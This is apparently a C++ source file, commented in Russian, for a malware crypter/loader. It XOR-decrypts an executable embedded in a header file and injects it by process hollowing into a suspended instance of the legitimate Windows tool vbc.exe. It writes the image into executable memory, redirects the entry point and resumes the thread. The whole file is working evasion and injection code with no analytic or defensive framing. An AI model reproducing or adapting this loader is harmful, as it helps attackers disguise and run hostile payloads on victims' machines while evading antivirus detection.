

#include <stdio.h>
#include <windows.h>
#include <vector>
#include <cstdio>
#include <TlHelp32.h> //WinAPI Process API
#include "output.h" // Заголовочный файл в котором содержиться ключ и байты зашифрованные в xor

#pragma warning(disable : 4996)



int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; // Для символов заголовка Nt DOS
	IMAGE_NT_HEADERS* NtHeader; // Для объектов и символов заголовка Nt PE
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Базовый адрес изображения
	void* pImageBase; // Указатель на базу изображения

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Инициализировать переменную
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Инициализировать
    
	  GetFullPathNameA("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe", 1024, CurrentFilePath, nullptr);// путь к текущему исполняемому файлу

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Проверка, является ли изображение PE-файлом.
	{
		ZeroMemory(&PI, sizeof(PI)); // Обнуляем память
		ZeroMemory(&SI, sizeof(SI)); // Обнуляем память

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Создайте новый экземпляр текущего
			//процесс в приостановленном состоянии для нового образа.
		{
			// Выделить память для контекста.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Контекст выделяется

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //если контекст находится в потоке
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
					
					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
				
				// Перенести адрес точки входа в регистр eax
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // и контекст
				ResumeThread(PI.hThread); //Запуск процесс/вызова main()

				return 0; // Операция прошла успешно.
			}
		}
	}
}





// Используем ключ и зашифрованные данные из заголовочного файла

int main()
{
    // Расшифровка байтов с использованием ключа
    std::vector<unsigned char> decryptedData;
    for (size_t i = 0; i < sizeof(encryptedData); ++i)
    {
        decryptedData.push_back(encryptedData[i] ^ key[i % strlen(key)]);
    }
    unsigned char* lpByte = decryptedData.data();
  	RunPortableExecutable(lpByte); // запустить исполняемый файл из массива
	getchar();
}
